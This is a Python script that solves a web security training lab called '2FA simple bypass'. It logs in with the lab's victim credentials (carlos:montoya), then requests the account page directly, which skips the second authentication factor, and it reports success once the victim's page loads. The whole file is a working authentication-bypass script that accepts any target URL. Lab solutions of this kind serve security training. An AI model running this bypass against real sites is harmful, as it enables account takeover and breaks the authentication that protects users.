"""
  Lab: 2FA simple bypass

  Steps:
  1. Log in carlos:montoya
  2. Navigate to /my-account after first factor

  Author: N00BCYB0T
"""
import argparse
import time
from colorama import Fore

import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

START_TIME = time.time()

def main():
  parser = argparse.ArgumentParser()
  parser.add_argument('-u', "--url", required=True, help='Target URL')
  parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
  args = parser.parse_args()

  print(f"{Fore.BLUE} Starting... {Fore.RESET}")
  session = requests.session()
  if args.proxy: 
    proxies = {
      "http": args.proxy,
      "https": args.proxy
    }
    session.proxies = proxies
  session.verify = False

  print(f"STEP 1: Login using carlos:montoya")
  try:
    ok = login(args.url, {"username":"carlos", "password":"montoya"}, session)
    if ok:
      try:
        success = fetch(args.url, 'my-account', 'carlos', session)
        if success:
          print(f"{Fore.GREEN}Lab Resolved!{Fore.RESET}")
        else:
          print(f"{Fore.RED}Erro{Fore.RESET}: Something are wrong if the bypass")
      except ValueError as e:
        print(f"{Fore.RED}Erro{Fore.RESET}: {e}!")
    else:
      print(f"{Fore.RED}Error{Fore.RESET}: Login was not possible.")
  except ValueError as e:
    print(f"It wasn't possible to bypass 2FA, review the requests on Burp Proxy\n{Fore.RED}Erro{Fore.RESET}: {e}!")


  

def login(url, data, session):
  try:
    response = session.post(f"{url}/login", data, allow_redirects=False)
    if response.status_code == 302:
      return True
    else:
      return False
  except ValueError as e:
    print(f"{Fore.RED}Error{Fore.RESET}: {e}!")

def fetch(url, path, data, session):
    try:
      response = session.get(f"{url}/{path}?id={data}", allow_redirects=False)
      if response.status_code == 200 and f"Your username is: {data}" in response.text:
        return True
      else:
        return False
    except ValueError as e:
      print(f"{Fore.RED}Error{Fore.RESET}: {e}!")

if __name__ == "__main__":
  main()